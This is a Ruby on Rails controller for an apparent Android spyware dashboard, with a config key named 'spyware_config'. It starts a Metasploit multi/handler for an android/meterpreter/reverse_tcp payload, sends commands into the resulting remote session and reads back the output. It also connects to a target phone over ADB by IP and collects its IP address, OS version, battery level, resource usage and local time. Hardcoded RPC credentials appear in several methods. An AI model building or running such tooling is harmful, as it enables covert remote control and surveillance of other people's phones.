require 'msfrpc-client'
require 'date'

class ApplicationController < ActionController::Base
    @@adbTarget=nil
    @@isAdbConnected=false
    @@isMsfConnected=false
    @@cpuUsage = @@memoryUsage = @@storage = 0
    @@nrFinishedProcesses=0
    @@nrRunningProcesses=0
    @@soundMode=2
    @@isAdbStarted=false
    @@ipAddress="Unknown"
    @@operatingSystem="Unknown"
    @@isRooted="Unknown"
    @@batteryLevel="Unknown"
    @@localHour="Unknown"



    def start_msf_process(command)
        begin
            @@nrRunningProcesses+=1
            user = 'cool'
            password = 'looc'
            options = {
              host: '127.0.0.1',
              port: 3333,
              uri:  '/api/',
              ssl:  true
            }
            rpc = Msf::RPC::Client.new(options)
            rpc.login(user, password)
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST'   => '0.0.0.0',
              'LPORT'   => 4444
            }
            job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            session=rpc.call('session.list').keys[0]

            puts rpc.call('session.meterpreter_write', session, command)
            sleep 4
            commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        rescue Msf::RPC::ServerException => e
            commandOutput="Operation Failed"
            puts e
            puts "MSF RPC Exception"
        rescue => exception
            puts "Starting MSF process failed."
        end
        puts commandOutput

        @@nrFinishedProcesses+=1
        @@nrRunningProcesses-=1
        return commandOutput      
    end

    def run_adb_command(command)
        begin
            sleep 1
            @@nrRunningProcesses+=1
            commandOutput=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} #{command}`
            @@nrFinishedProcesses+=1
            @@nrRunningProcesses-=1
        rescue
            commandOutput="Operation Failed"
        end
        puts commandOutput
        return commandOutput
    end

    def detach_session
        begin
            require 'msfrpc-client'
            require 'date'
            user = 'cool'
            password = 'looc'
            options = {
              host: '127.0.0.1',
              port: 3333,
              uri:  '/api/',
              ssl:  true
            }
            rpc = Msf::RPC::Client.new(options)
            rpc.login(user, password)
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST'   => '0.0.0.0',
              'LPORT'   => 4444
            }
            job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            session=rpc.call('session.list').keys[0]

            puts rpc.call('session.meterpreter_session_detach', session)
            sleep 4
            commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        rescue
            commandOutput="Operation Failed"
            puts "Error detaching session."
        end
        return commandOutput
    end 

    def update_cpu_usage
        begin
            puts " target"
            cpuOutput1=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
            totalJiffles1=cpuOutput1.inject(:+)
            workJiffles1=cpuOutput1.slice(0,3).inject(:+)
            sleep(0.5)
            cpuOutput2=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
            totalJiffles2=cpuOutput2.inject(:+)
            workJiffles2=cpuOutput2.slice(0,3).inject(:+)
            workOverPeriod=workJiffles2 - workJiffles1
            totalOverPeriod=totalJiffles2 - totalJiffles1
            @@cpuUsage=(workOverPeriod * 100 / totalOverPeriod).to_i
        rescue
          @@cpuUsage = 0
          puts "Error updating CPU Usage"
        end
    end

    def update_memory_usage
        begin
            memoryTotal=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, '').to_f
            memoryAvailable=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, '').to_f
            @@memoryUsage=((memoryTotal- memoryAvailable)/memoryTotal * 100).to_i
        rescue
            @@memoryUsage=0
            puts "Error updating Memory Usage"
        end
    end

    def update_storage_usage
        begin
            totalMemory=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[1].gsub(/[^\d\.]/, '').to_f
            usedMemory=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[2].gsub(/[^\d\.]/, '').to_f
            @@storage=(usedMemory / totalMemory * 100).to_i
        rescue
            @@storage=0
        end
    end

    def update_device_info
        begin
            @@ipAddress=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "ip addr show wlan0 | grep inet | grep -v inet6"`.split[1].gsub(/\/\d*/,'')
            @@operatingSystem='Android ' + `tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell getprop ro.build.version.release`.strip
            @@isRooted="Rooted: No"
            @@localHour=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell date +%R`.strip
            @@batteryLevel=`tools\\platform-tools\\adb.exe -s #{@@adbTarget} shell "dumpsys battery | grep level"`.split(':')[1].strip + '%'
        rescue
            puts "Error updating device info."
        end
    end

    def check_msf_connection
        begin
            user = 'cool'
            password = 'looc'
            options = {
              host: '127.0.0.1',
              port: 3333,
              uri:  '/api/',
              ssl:  true
            }
            rpc = Msf::RPC::Client.new(options)
            rpc.login(user, password)
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST'   => '0.0.0.0',
              'LPORT'   => 4444
            }
            job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            sessions=rpc.call('session.list')
            @@isMsfConnected=sessions.size > 0 ? true : false
        rescue Msf::RPC::ServerException => e
            puts e
            puts "Docker MSF Container is Down"
        rescue
            puts "Failed checking MSF Connection"
        end
    end

    def check_adb_connection
        begin
            @@adbTarget = Rails.configuration.spyware_config['target_ip']
            if ! @@isAdbConnected
                if @@adbTarget != 'usb'
                    system("tools\\platform-tools\\adb.exe kill-server")
                    system("tools\\platform-tools\\adb.exe tcpip 5555")
                    system("tools\\platform-tools\\adb.exe connect #{@@adbTarget}")
                else
                    system("tools\\platform-tools\\adb.exe kill-server")
                    system("tools\\platform-tools\\adb.exe start-server")
                end
            end
            adbDevices=`tools\\platform-tools\\adb.exe devices`.split("\n")
            
            if (@@adbTarget == 'usb' and adbDevices.size > 1 and adbDevices.any? { |line| line.strip.end_with? "device" }) or adbDevices.any? {|line| line =~ /#{@@adbTarget}:5555\s+device/ }
                @@adbTarget=adbDevices.find { |line| line.strip.end_with? "device" }.split[0] if @@adbTarget == 'usb'
                @@isAdbConnected=true
                update_cpu_usage
                update_memory_usage
                update_storage_usage
                update_device_info
            else
                @@isAdbConnected=false
            end
          rescue
              puts "Error checking ADB connection"
          end
    end
        
    def check_connection
        check_msf_connection
        check_adb_connection
        respond_to do |format|
            format.js { render "check_connection", :locals => {:adbConnected => @@isAdbConnected,
                                                               :msfConnected => @@isMsfConnected,
                                                               :cpuUsage => @@cpuUsage,
                                                               :memoryUsage => @@memoryUsage,
                                                               :storage => @@storage,
                                                               :nrRunningProcesses => @@nrRunningProcesses,
                                                               :nrFinishedProcesses => @@nrFinishedProcesses,
                                                               :ipAddress => @@ipAddress,
                                                               :operatingSystem => @@operatingSystem,
                                                               :isRooted => @@isRooted,
                                                               :batteryLevel => @@batteryLevel,
                                                               :localHour => @@localHour }  }
        end
    end
end
